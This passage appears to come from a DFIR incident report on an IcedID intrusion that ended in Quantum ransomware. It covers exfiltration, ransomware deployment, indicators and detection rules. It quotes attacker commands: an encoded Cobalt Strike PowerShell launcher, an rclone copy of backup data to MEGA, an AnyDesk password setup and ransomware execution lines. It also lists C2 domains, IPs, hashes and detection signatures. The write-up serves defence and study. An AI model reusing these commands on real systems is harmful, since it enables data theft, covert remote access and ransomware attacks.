<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-066.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16951" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-066.png" alt width="782" height="535" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-066.png 782w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-066-300x205.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-066-768x525.png 768w" sizes="(max-width: 782px) 100vw, 782px" /></a></p>
<p>The AnyDesk service password was set manually using the command line as shown below:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-067.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16952" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-067.png" alt width="1667" height="160" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-067.png 1667w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-067-300x29.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-067-1024x98.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-067-768x74.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-067-1536x147.png 1536w" sizes="(max-width: 1667px) 100vw, 1667px" /></a></p>
<pre class="wp-block-preformatted">powershell -np -w hidden -encodedcommand JABzAD0ATgBlAHcAL [.....] --&gt; CS beacon
  --&gt; "c:\windows\syswow64\windowspowershell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile
    --&gt;  C:\Windows\system32\cmd.exe /C cmd.exe /c echo Qwerty123!@#_! | C:\ProgramData\anydesk.exe --set-password</pre>
<p>The software packages were bundled within a single Microsoft Software Installer (MSI) package, named hp.msi. This was installed from the ProgramData folder, resulting in the installation of the remote management tools. The activity can be correlated against the Application log for MSI installer events (Event ID 1033).</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-068.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16953" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-068.png" alt width="651" height="132" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-068.png 651w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-068-300x61.png 300w" sizes="(max-width: 651px) 100vw, 651px" /></a></p>
<h2 class="wp-block-heading" id="exfiltration"><a href="#exfiltration">Exfiltration</a></h2>
<p>During the intrusion, the threat actors were observed accessing collected data such as ShareFinder.txt using Notepad and then copying the contents to the clipboard.</p>
<p>Whilst the process activity indicated Active Directory accounts being used, correlating this activity to Clipboard activity indicated matching sessions, process IDs, and the true source of the user.</p>
<p>In this case, ShareFinder.txt was created in the ProgramData folder by the ShareFinder.ps1 script. Approximately 2 seconds later, the threat actors accessed this file and copied the contents.</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-16981" src="https://thedfirreport.com/wp-content/uploads/2023/04/123.png" alt width="1997" height="760" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/123.png 1997w, https://thedfirreport.com/wp-content/uploads/2023/04/123-300x114.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/123-1024x390.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/123-768x292.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/123-1536x585.png 1536w" sizes="(max-width: 1997px) 100vw, 1997px" /></p>
<p>While the threat actors made attempts to proxy RDP traffic and minimize external RDP access, the threat actors&#8217; workstation was revealed in several Windows logs. Sysmon Event ID 24 linked the threat actors host name HYPERV and the IPv4 address of 199.101.184[.]230. This host name was also in the Security events:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-070.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16955" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-070.png" alt width="278" height="175" /></a></p>
<p>For example, Event 4779 relating to a user disconnecting from a terminal session, reveals the client name of the source workstation. The client address was the internal workstation where the RDP traffic was being proxied through.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-071.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16956" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-071.png" alt width="664" height="776" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-071.png 664w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-071-257x300.png 257w" sizes="(max-width: 664px) 100vw, 664px" /></a></p>
<h3 class="wp-block-heading">Exfiltrated Documents Opened Remotely</h3>
<p>During the second day of the intrusion, documents from the organization were opened remotely from 212.102.59[.]162 and 165.231.182[.]14. This occurred before Rclone was used, which leads us to believe the documents were exfiltrated over one of the encrypted C2 channels.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-072.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16957" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-072.png" alt width="575" height="208" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-072.png 575w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-072-300x109.png 300w" sizes="(max-width: 575px) 100vw, 575px" /></a></p>
<h3 class="wp-block-heading">Rclone</h3>
<p>On the backup server, rclone.exe was used in order to exfiltrate data to a MEGA cloud storage.</p>
<pre class="wp-block-preformatted">rclone.exe  copy --max-age 5y "\\[REDACTED BACKUP]\E:\[REDACTED]\" remote:Groups --exclude "*.{psd,7z,dwg,rar,MTS,MOV,pst,PRF,mp3,skp,tmp,gcp,zip,ZIP,MP4,tiff,ava4,psb,tif,DNG,AVI,FIT,FIL,mp4,dxf,mov,rcs,mdb,iso,json,man,exe,gz,ISO,dll,BAK,bak,tib,MP3,tar,m4v,vmdk,vm,PBD,db,BAKDB,icon,msi,ai,gif,cab,iso,png,eps,lib,avi,msg,crs,LIB,CRS,mpg,dcm,tif}" -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P</pre>
<p>From the rclone.exe configuration file, we can retrieve the user&#8217;s mail address and password.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-073.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16958" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-073.png" alt width="383" height="89" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-073.png 383w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-073-300x70.png 300w" sizes="(max-width: 383px) 100vw, 383px" /></a></p>
<p>Mega user account:</p>
<pre class="wp-block-preformatted"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ff9890909b89969d9ac7c7c7bf8f8d908b9091d1929a">[email&#160;protected]</a></pre>
<h2 class="wp-block-heading" id="impact"><a href="#impact">Impact</a></h2>
<h3 class="wp-block-heading">Alert</h3>
<p>Interestingly, the operator issued a command that displayed an alert informing the end user of a compromise, specifically with Cobalt Strike. Its unclear why the operator chose to do this, as this was around three hours prior to the ransomware being executed or a ransom note being dropped.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-074.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16959" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-074.png" alt width="724" height="62" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-074.png 724w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-074-300x26.png 300w" sizes="(max-width: 724px) 100vw, 724px" /></a></p>
<p>The alert message that was visible:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-075.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16960" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-075.png" alt width="309" height="132" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-075.png 309w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-075-300x128.png 300w" sizes="(max-width: 309px) 100vw, 309px" /></a></p>
<p>The activity can be observed in the PowerShell WinEvent logs:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-076.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16961" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-076.png" alt width="574" height="332" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-076.png 574w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-076-300x174.png 300w" sizes="(max-width: 574px) 100vw, 574px" /></a></p>
<h3 class="wp-block-heading">Ransomware</h3>
<p>The threat actors dropped the first of their ransomware binaries on the fourth day of the intrusion. Around 40 minutes after creating the alert messages for Cobalt Strike to show up, they dropped locker_64.exe on the backup server. They created a file (2.txt) and populated it with a list of hosts they had uncovered during their discovery activity. The locker_64.exe file was then renamed to 64.exe and executed using the text file in the command arguments:</p>
<pre class="wp-block-preformatted">64.exe /<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="dbafbaa9bcbeafe69be9f5afa3af">[email&#160;protected]</a></pre>
<p>The threat actors attempted to execute the malware across all hosts in the target list, but only execution on the backup server was observed.</p>
<p>The threat actor then tried again on a different server using a DLL this time:</p>
<pre class="wp-block-preformatted">rundll32 locker_32.dll,run /<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b1c5d0c3d6d4c58cf1839fc5c9c5">[email&#160;protected]</a></pre>
<p>Again, only execution on the server was observed. They then executed a new Cobalt Strike PowerShell beacon on a 3rd server and executed the ramsomware using that.</p>
<pre class="wp-block-preformatted">"c:\windows\syswow64\windowspowershell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile
     ➝ C:\Windows\system32\cmd.exe /C locker_64.exe</pre>
<p>They then opened an RDP connection back to the primary domain controller and proceeded to try to execute the binary with a target list again. After only affecting the single host, the threat actors dropped several batch scripts on the server:</p>
<pre class="wp-block-preformatted">pass.bat
1.bat
2.bat</pre>
<p>The script pass.bat proceeded to reset all the user accounts in the domain to a single password set by the threat actors.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-077.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16962" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-077.png" alt width="1590" height="807" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-077.png 1590w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-077-300x152.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-077-1024x520.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-077-768x390.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-077-1536x780.png 1536w" sizes="(max-width: 1590px) 100vw, 1590px" /></a></p>
<p>There were thousands of Windows Security Event ID 4724 events generated within a two minute period.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-078.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16963" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-078.png" alt width="510" height="257" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-078.png 510w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-078-300x151.png 300w" sizes="(max-width: 510px) 100vw, 510px" /></a></p>
<p>This password reset would enable the next scripts to function as intended while also hampering any recovery activity.</p>
<p>The 1.bat file then proceeded to copy the ransomware binary across to hosts in the environment.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-079.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16964" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-079.png" alt width="1910" height="1240" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-079.png 1910w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-079-300x195.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-079-1024x665.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-079-768x499.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-079-1536x997.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-079-1000x650.png 1000w" sizes="(max-width: 1910px) 100vw, 1910px" /></a></p>
<p>Finally 2.bat used the reset password to enable psexec to execute the ransomware on all the remote hosts.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-080.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16965" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-080.png" alt width="1243" height="851" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-080.png 1243w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-080-300x205.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-080-1024x701.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-080-768x526.png 768w" sizes="(max-width: 1243px) 100vw, 1243px" /></a></p>
<p>When the payload was executed, there were some telltale registry events observed indicating .Quantum file extension Shell Open Command artifacts.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-081.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16966" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-081.png" alt width="682" height="79" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-081.png 682w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-081-300x35.png 300w" sizes="(max-width: 682px) 100vw, 682px" /></a></p>
<p>The HTML message was dropped in various directories across the endpoints:</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-082.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16967" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-082.png" alt width="754" height="482" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-082.png 754w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-082-300x192.png 300w" sizes="(max-width: 754px) 100vw, 754px" /></a></p>
<p>The HTML file displayed the all but familiar message:</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-083.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16968" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-083.png" alt width="1600" height="937" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-083.png 1600w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-083-300x176.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-083-1024x600.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-083-768x450.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-083-1536x900.png 1536w" sizes="(max-width: 1600px) 100vw, 1600px" /></a></figure>
<p>The following Locker files were then deleted:</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-84.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16969" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-84.png" alt width="218" height="130" /></a></figure>
<h2 class="wp-block-heading" id="diamond-model"><a href="#diamond-model">Diamond Model</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-085.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16970" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-085.png" alt width="1216" height="594" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-085.png 1216w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-085-300x147.png 300w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-085-1024x500.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-085-768x375.png 768w" sizes="(max-width: 1216px) 100vw, 1216px" /></a></p>
<h2 class="wp-block-heading" id="timeline"><a href="#timeline">Timeline</a></h2>
<h2>
</h2>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-000-3.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-16992" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-000-3.png" alt width="3487" height="7236" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-000-3.png 3487w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-000-3-145x300.png 145w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-000-3-493x1024.png 493w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-000-3-768x1594.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-000-3-740x1536.png 740w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-000-3-987x2048.png 987w" sizes="(max-width: 3487px) 100vw, 3487px" /></a></figure>
<h2> </h2>
<h2> </h2>
<h2 id="indicators"><a href="#indicators">Indicators</a></h2>
<h3 class="wp-block-heading">Atomic</h3>
<pre class="wp-block-preformatted">IcedID:

alockajilly.com
zoomersoidfor.com
choifejuce.lol
opiransiuera.com
erinindiaka.quest
opiransiuera.com
zoomersoidfor.com
considerf.info
antiflamez.bar
www.onlinecloud.cloud
64.227.12.180:80
5.196.103.145:443
66.63.188.70:443
178.128.85.30:443
5.252.177.10:443
46.101.19.119:443</pre>
<pre class="wp-block-preformatted">Cobalt Strike:

fazehotafa.com
guteyutu.com 
45.66.151.109
172.93.181.165
111.90.143.191
78.128.112.139</pre>
<pre class="wp-block-preformatted">Mega User:
goodvibe888@proton[.]me

Attacker Infrastructure:
199.127.60[.]117
199.101.184[.]230</pre>
<h3 class="wp-block-heading">Computed</h3>
<pre class="wp-block-preformatted">Invoice-09-28#268_PDF.iso
515047b6ce410001696812bc85e197d1
26b11c95a6a324dbb0ab32428361b0531234ecee
68f971a1b391f809058e83058a2037d29c28a8a21fd618b0d952466c632ff1be

documents.lnk
1af7a0e058ce1b63b138a1425a835561
66b8da857c6dc45dea3a9fb17a503b3c2d203245
1ee563caf943d3a7ed315dda9c37f0c9c445eec6dfb78ae196d2989626a0dfec

eyewear.bat
0d51c60c67c62836ba0f7948113b3737
a597205ed55b6e6413a17edb62cbb29bda735676
999cba918c297bf0b0d7d4aa9003e6338cc300a9270cc758d1d108c26603417d

easygoing.dat
f102a95e749d1ee63c71df902856ae51
fda81b5951bb02ef0236088c310d9bc4fa70e1e6
f27d924911a7087928012764358bad9240b2ba8aeeca5e0d717abdbb82344981

rapuab1.dll
ce1b0e77a31da8dc68f77a977b04f3e4
5facd0aa9a29e0768ab9f432c79eac173af69711
163800b0fbf1b1b7bbc7f719df421ed717111c7c9ddea9c9b41f898ee22dd51a

9bd6b1f24b9589a3fbc1d54b6e6184b8
f8473c6c8b298a3d72c8ca890667eddab62d2ba8
03a9d6afc99e70333723d921bd1265ac948cdabb8b15689b5ceb1c02365a9572

beacA.dll
1b1497c2758ff5a8ade2df336a7a6c2d
d6cc874f84797813c225318b877eace04ca5f5a1
47ed0d1c7d8abc159d1eb2bb9fbe037f38b0846217cc11132652734f93ad5678

beaconM-1664297797-T0B9Z_32-cr.exe
dbb08886c60f3c44b377d09bd9d8b6d3
7262b7df4d90409fb141856d9b55792872deda20
8f7cc7cc14a12753d41678981b929546d12218d457a9d22951808cb5f19e549c

df5ce1159ef2e257df92e1825d786d87
a7e163eaa0fc2afb9c0d5ac6f79cb3e49919dd3c
842737b5c36f624c9420a005239b04876990a2c4011db87fe67504fa09281031

AD.bat
e77f23aac8db0d23196b6bef64fe04fc
90bf77e194970dd74d1b49faf58ae395ce49bb34
c2ebcc389304539bc13c3d2023cf88f9ea0bac7210fefa03f8333eaab0bbb76d

ns.bat
7ac356035fce31e9e14c3a3d371ddf41
61f838d9b0998ab23877e86f6e8ba3551799e07c
4f52c7448bdcb4caa2eff701b0f3b60b406aea278ecd5a3b23cac808a65418e7

92edbbeff775928cfc6e3c8efefe4ecc
fffa0ce086791c41360971e3ce6a0d1af1701616
fc4da07183de876a2b8ed1b35ec1e2657400da9d99a313452162399c519dbfc6

955d0cf317efe48bf0394330fcd82ebb
d84d40038311e188e25c78389b51b900de9c69bd
e9da08831e0d4395f697e4f18c87be941bf52c79d84da1cc88186bdea1ebf4f4

lsass.dll
adc50d0c1e7bf37288a612a0f278e028
6254e8cca47d87f29e85627a08ba88b79915a459
fafc84466c1ce361bb6ce219bde2b64ca07a6a6feda23f444749ba06c44b0580

397020072f5787dbbc0c344f98623bbd
970e793c86266b20d280c04e0f41ec7ae9c2093c
6511d6e84343c2d3a4cd36853170509e2751e27c86f67c6a031dc88e7e495e48

601d613bff412d245e3edf46dc499d83
a39b9119003c63583e2a0f11f19f3e6050399176
2a2c83a7c8cd33e45dc14b8d955e00161580d6d2736f4e75a235aa3eb2f21528

locker_32.dll
131d277cfbc9f4b2d667150d84ad503d
f05ff93ee4d2f31bc70c0484a559d562203b7700
a378b8e9173f4a5469e7b5105be40723af29cbd6ee00d3b13ff437dae4514dff

license.dat
b31de50a57e8cb73c9efda8b97ffa261
a7e3f617644599ec695da84d140a7b69c392a421<br/>55be890947d021fcc8c29af3c7aaf70d8132f222e944719c43a6e819e84a8f8b</pre>
<h2 class="wp-block-heading" id="detections"><a href="#detections">Detections</a></h2>
<h3 class="wp-block-heading">Network</h3>
<pre class="wp-block-preformatted">ET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike
ET Threatview.io High Confidence Cobalt Strike C2 IP group 2
ET INFO Pastebin-style Service (textbin .net in TLS SNI)
ET INFO Splashtop Domain (splashtop .com) in TLS SNI
ET INFO Splashtop Domain in DNS Lookup (splashtop .com)
ET MALWARE Meterpreter or Other Reverse Shell SSL Cert
ET POLICY PE EXE or DLL Windows file download HTTP
ET INFO Dotted Quad Host DLL Request
ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download
ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response
ET HUNTING Suspicious lsass.exe in URI
ET MALWARE Win32/IcedID Request Cookie
ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software)
ET USER_AGENTS AnyDesk Remote Desktop Software User-Agent
ET EXPLOIT Possible Zerologon Phase 1/3 - NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472)
ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1
ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472)</pre>
<h3 class="wp-block-heading">Sigma</h3>
<figure class="wp-block-embed">
<div><a href="https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_uninstall_defender.yml">https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_uninstall_defender.yml</a></div>
<div><a href="https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_winevent_security_query.yml">https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_winevent_security_query.yml</a></div>
<div class="wp-block-embed__wrapper"><a href="https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_chcp_codepage_locale_lookup.yml">https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_chcp_codepage_locale_lookup.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_adfind_discovery.yml">https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_adfind_discovery.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_system_time_lookup.yml">https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_system_time_lookup.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/pipe_created_mal_cobaltstrike.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/pipe_created_mal_cobaltstrike.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/NVISOsecurity/sigma-public/blob/master/rules/windows/process_creation/win_susp_recon_activity.yml">https://github.com/NVISOsecurity/sigma-public/blob/master/rules/windows/process_creation/win_susp_recon_activity.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_procdump.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_procdump.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_procdump_lsass.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_procdump_lsass.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_nltest_recon.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_nltest_recon.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbin_not_from_c_drive.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_lolbin_not_from_c_drive.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_base64_encoded_cmd.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_base64_encoded_cmd.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_meterpreter_getsystem.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_meterpreter_getsystem.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/system/win_system_service_install_remote_access_software.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/builtin/system/win_system_service_install_remote_access_software.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_wmic_process_creation.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_wmic_process_creation.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/create_remote_thread/create_remote_thread_win_password_dumper_lsass.yml">https://github.com/SigmaHQ/sigma/blob/master/rules/windows/create_remote_thread/create_remote_thread_win_password_dumper_lsass.yml</a></div>
</figure>
<figure class="wp-block-embed">
<div class="wp-block-embed__wrapper"><a href="https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_cobaltstrike_operator_bloopers_cmds.yml">https://github.com/The-DFIR-Report/Sigma-Rules/blob/main/rules/windows/process_creation/proc_creation_win_cobaltstrike_operator_bloopers_cmds.yml</a></div>
</figure>
<h3 class="wp-block-heading">Yara</h3>
<p><a href="https://malpedia.caad.fkie.fraunhofer.de/yara/win.cobalt_strike" target="_blank" rel="noreferrer noopener">win_cobalt_strike_auto</a></p>
<p><a href="https://github.com/chronicle/GCTI/blob/main/YARA/CobaltStrike/CobaltStrike__Resources_Artifact32_and_Resources_Dropper_v1_45_to_v4_x.yara" target="_blank" rel="noreferrer noopener">CobaltStrike__Resources_Artifact32_and_Resources_Dropper_v1_45_to_v4_x.yara</a></p>
<p><a href="https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18041/18041.yar">https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18041/18041.yar</a></p>
<h2 class="wp-block-heading" id="mitre"><a href="#mitre">MITRE</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/04/18041-086-4.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-17022" src="https://thedfirreport.com/wp-content/uploads/2023/04/18041-086-4.png" alt width="1786" height="3012" srcset="https://thedfirreport.com/wp-content/uploads/2023/04/18041-086-4.png 1786w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-086-4-178x300.png 178w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-086-4-607x1024.png 607w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-086-4-768x1295.png 768w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-086-4-911x1536.png 911w, https://thedfirreport.com/wp-content/uploads/2023/04/18041-086-4-1214x2048.png 1214w" sizes="(max-width: 1786px) 100vw, 1786px" /></a></p>
<pre class="wp-block-preformatted">Spearphishing Attachment - T1566.001
